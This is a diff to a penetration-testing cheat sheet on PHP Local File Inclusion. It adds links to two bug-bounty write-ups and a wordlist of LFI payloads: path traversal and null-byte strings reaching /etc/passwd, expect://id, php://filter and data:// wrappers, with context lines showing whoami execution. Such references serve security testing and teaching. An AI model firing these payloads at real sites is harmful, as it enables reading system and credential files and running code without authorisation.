@@ -12,6 +12,7 @@
    - [Path Traversal with Encoding](#72-path-traversal-with-encoding)
    - [Zip Wrapper for Code Execution](#73-zip-wrapper-for-code-execution)
    - [Proc Filesystem Exploitation](#74-proc-filesystem-exploitation)
+8. [Wordlist](#Wordlist)
 
 ---
 
@@ -82,6 +83,10 @@ http://example.com/index.php?page=php://filter/convert.base64-decode/resource=da
 This decodes and executes the payload, running the `whoami` command.
 
 **Validation**: Mostly correct. The `php://filter` wrapper is a powerful LFI technique. However, the `data://` wrapper is better categorized separately (see below). Also, `php://filter` requires precise syntax, and some servers may block `base64-decode` due to security filters.
+
+PoC: [$4500 Local File Inclusion: The Tiny Parameter That Exposed an Entire Infrastructure](https://medium.com/@cyberknight/4500-local-file-inclusion-the-tiny-parameter-that-exposed-an-entire-infrastructure-74f7d3cc669c)
+<br>
+PoC: [From LFI to RCE via expect:// PHP Wrapper](https://medium.com/@zoningxtr/from-lfi-to-rce-via-expect-php-wrapper-a-deep-dive-with-practical-examples-699690073fe8)
 
 ---
 
@@ -192,3 +197,14 @@ This may reveal environment variables, including database credentials or API key
 **Use Case**: Useful for reconnaissance when direct file access is restricted.
 
 ---
+
+### Wordlist
+
+```
+../../../../etc/passwd
+../../../../etc/passwd%00
+expect://id
+file:///etc/passwd
+php://filter/convert.base64-encode/resource=/etc/passwd
+data://text/plain,<?php%20phpinfo();%20?>
+```
